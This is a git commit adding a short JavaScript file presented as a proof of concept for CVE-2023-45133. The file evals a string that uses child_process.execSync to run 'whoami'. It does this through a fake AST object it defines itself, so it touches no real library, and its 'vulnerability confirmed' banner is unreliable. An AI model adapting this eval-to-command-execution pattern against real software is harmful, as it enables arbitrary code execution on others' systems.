97c31ca3e3a1129d1f0c018b9ab8dc1c0cd56e5b
reyhkm <reyhikam04@gmail.com>
2025-08-21 01:32:14 +0700

    Create poc_cve_2023_45133.js

---
+++ poc_cve_2023_45133.js
@@ -0,0 +1,19 @@
+// File: poc_cve_2023_45133.js
+
+const code = `
+  require('child_process').execSync('echo "--- VULNERABILITY CONFIRMED ---"; whoami; echo "--- END OF POC ---"');
+`;
+
+function vulnerableFunction(path) {
+  try {
+    path.evaluate();
+  } catch (e) {
+    // Ignore errors
+  }
+}
+
+const fakeAst = {
+  evaluate: () => eval(code)
+};
+
+vulnerableFunction(fakeAst);
